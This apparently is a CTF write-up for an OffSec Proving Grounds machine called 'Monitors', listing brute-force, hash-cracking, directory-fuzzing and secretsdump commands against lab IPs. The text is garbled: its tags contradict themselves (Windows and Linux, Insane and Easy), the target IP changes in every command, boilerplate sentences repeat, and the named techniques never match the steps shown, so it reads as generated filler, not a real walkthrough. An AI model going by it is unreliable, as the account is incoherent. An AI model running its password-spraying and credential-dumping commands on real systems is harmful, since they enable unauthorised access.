---
TitleSEO: "OffSec Proving Grounds — Monitors (Insane Windows) | ZureFX"
TitlePost: "OffSec Proving Grounds — Monitors (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Monitors. GPP Password and Insecure Deserialization to achieve insane compromise on Windows."
Keywords: "insane, easy, linux, pwntilldawn"
URL: "https://zurefx.github.io/writeups/htb-monitors-491.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-monitors-491/"
Date: "2024-02-11"
Tags: "Insane, Easy, Linux, PwnTillDawn"
Section: "writeups"
Lang: "en"
main_img: "htb-monitors-491"
Permalink: "/writeups/htb-monitors-491.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Monitors** is rated **Insane** on OffSec Proving Grounds. It runs **Windows** and the IP address during this analysis was `10.120.247.81`.

### Objectives

Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p27017,80,5985 10.115.53.174 -oN scan.txt
gobuster dir -u http://10.121.121.248/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.44.221.17 -u administrator -p 'P@ssw0rd!'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Service Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.46.58.242 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.112.112.116/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism.

### SMB Enumeration

Unconstrained delegation was enabled on the compromised machine. The application stored sensitive credentials in an unencrypted configuration file.

```bash
gobuster dir -u http://10.20.162.86/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code.

## Exploitation

### Vulnerability Identification

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target.

Key finding: **Constrained Delegation**.

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services.

### Initial Access

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
gobuster dir -u http://10.77.127.115/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials.

## Privilege Escalation

### Enumeration

The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files.

```powershell
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.107.76.24/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.103.65.4 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.109.20.181
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.97.176.184/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.100.233.44
```

The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

## Summary

### Tools Used

- `john`
- `hydra`
- `sqlmap`
- `smbexec`
- `enum4linux`

### Key Takeaways

- GPP Password
- Insecure Deserialization
- Pass the Hash
- Constrained Delegation
